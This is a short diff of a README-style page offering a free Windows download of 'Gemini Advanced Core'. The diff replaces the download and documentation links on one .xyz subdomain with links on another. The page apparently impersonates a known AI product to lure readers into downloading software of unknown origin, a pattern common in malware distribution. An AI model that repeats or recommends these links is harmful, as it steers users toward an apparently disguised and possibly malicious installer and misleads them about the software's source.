@@ -35,8 +35,8 @@ Yes — it's free to download and use.
 ---
 
 ## Get the app
-- 📥 **Download for Windows:** [https://gemini-advanced-core.softonx.xyz](https://gemini-advanced-core.softonx.xyz)
-- 📖 **Details & docs:** [https://gemini-advanced-core.softonx.xyz](https://gemini-advanced-core.softonx.xyz)
+- 📥 **Download for Windows:** [https://gemini-advanced-core.softax.xyz](https://gemini-advanced-core.softax.xyz)
+- 📖 **Details & docs:** [https://gemini-advanced-core.softax.xyz](https://gemini-advanced-core.softax.xyz)
 
 ---
 
